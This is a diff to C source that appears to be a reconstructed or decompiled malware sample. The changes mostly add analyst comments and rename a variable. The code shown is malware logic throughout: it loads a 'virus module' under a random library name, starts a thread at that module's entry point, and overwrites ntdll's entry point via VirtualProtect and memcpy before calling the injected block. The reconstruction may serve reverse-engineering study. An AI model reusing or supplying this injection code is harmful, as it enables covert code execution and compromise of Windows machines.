@@ -45,11 +45,13 @@ INT32 BLOCK4_InjectAndExecuteVirus(PASM_CODE_BLOCKS_HEADER sASMCodeBlocksHeader)
 	if(iResult) return -4;
 
 	pVirusModule = pHardAddrs->LoadLibraryW(sInfoBlockCopy.RandomLibraryName);
-	if(!pVirusModule) return -9;
+	if(!pVirusModule)
+		return -9;
 
 	pVirusModuleSection->VirusModulePointer = pVirusModule;
 	if(pVirusModuleSection->LibraryExecuteEntryNumber != -1)
 	{
+		// Create thread where entrypoint is this function with the same parameter as was given to us
 		hThread = pHardAddrs->CreateThread(NULL, 0x00080000, (LPTHREAD_START_ROUTINE)sASMCodeBlocksHeader->ExecuteLibrary, sASMCodeBlocksHeader, 0, NULL);
 
 		if(!hThread) return -13;
@@ -70,7 +72,7 @@ INT32 BLOCK4_InjectAndExecuteVirus(PASM_CODE_BLOCKS_HEADER sASMCodeBlocksHeader)
 }
 
 // 99% (C) CODE MATCH
-// Dis gets ran on virus startup  think
+// Dis gets ran on virus startup I think
 INT32 BLOCK4_ExecuteLibrary(PASM_CODE_BLOCKS_HEADER sASMCodeBlocksHeader)
 {
 	FARPROC pLibraryExecEntry; // [sp+0h] [bp-Ch]@1
@@ -78,13 +80,17 @@ INT32 BLOCK4_ExecuteLibrary(PASM_CODE_BLOCKS_HEADER sASMCodeBlocksHeader)
 	PHARDCODED_ADDRESSES pHardAddrs; // [sp+8h] [bp-4h]@1
 
 	pVirusModuleSection = (PVIRUS_MODULE_BLOCKS_HEADER)sASMCodeBlocksHeader->VirusModuleSection;
+
+	// g_hardAddrs in memory
 	pHardAddrs          = (PHARDCODED_ADDRESSES)(sASMCodeBlocksHeader->ASMBlock1Segment.SegmentAddress + _SIZE(&g_hardAddrs, __ASM_BLOCK1_0));
 
+	// Ordinal seems to be -1. Maybe this gets the init function for the virus?
 	pLibraryExecEntry = pHardAddrs->GetProcAddress(pVirusModuleSection->VirusModulePointer, (LPCSTR)pVirusModuleSection->LibraryExecuteEntryNumber);
 
 	if(pLibraryExecEntry)
 	{
 		// Note: Same arguments passed to the 15th function of the internal library, maybe it was another module loaded in the past?
+		// As-is, this is calling the function with the arguments (NULL, 0)
 		((__tLibraryExecEntry)pLibraryExecEntry)(pVirusModuleSection->UnknownSegment.SegmentAddress, pVirusModuleSection->UnknownSegment.SegmentSize);
 		return 0;
 	}
@@ -223,9 +229,9 @@ INT32 BLOCK4_InjectCodeIntoNTDLL(ASM_CODE_BLOCKS_HEADER *sASMCodeBlocksHeader, P
 	if(pHardAddrs->VirtualProtect(hHandleNTDLL, 0x1000, PAGE_EXECUTE_WRITECOPY, &dwOld))
 	{
 		// Copy code into ntdll entry point...
-		BLOCK4_memcpy(v4, (const void *)sASMCodeBlocksHeader->ASMBlock0Segment.SegmentAddress, sASMCodeBlocksHeader->ASMBlock0Segment.SegmentSize);
+		BLOCK4_memcpy(NTDLL_Entry, (const void *)sASMCodeBlocksHeader->ASMBlock0Segment.SegmentAddress, sASMCodeBlocksHeader->ASMBlock0Segment.SegmentSize);
 
-		// ...then call ASMBlock1Segment with a pointer to the entry point as an argument
+		// ...then call __ASM_BLOCK1_0 with a pointer to the entry point as ECX because __thiscall
 		((void (__thiscall *)(void *))sASMCodeBlocksHeader->ASMBlock1Segment.SegmentAddress)(NTDLL_Entry); // __thiscall ignored by compiler
 		pHardAddrs->FlushInstructionCache((HANDLE)-1, NULL, 0);
 
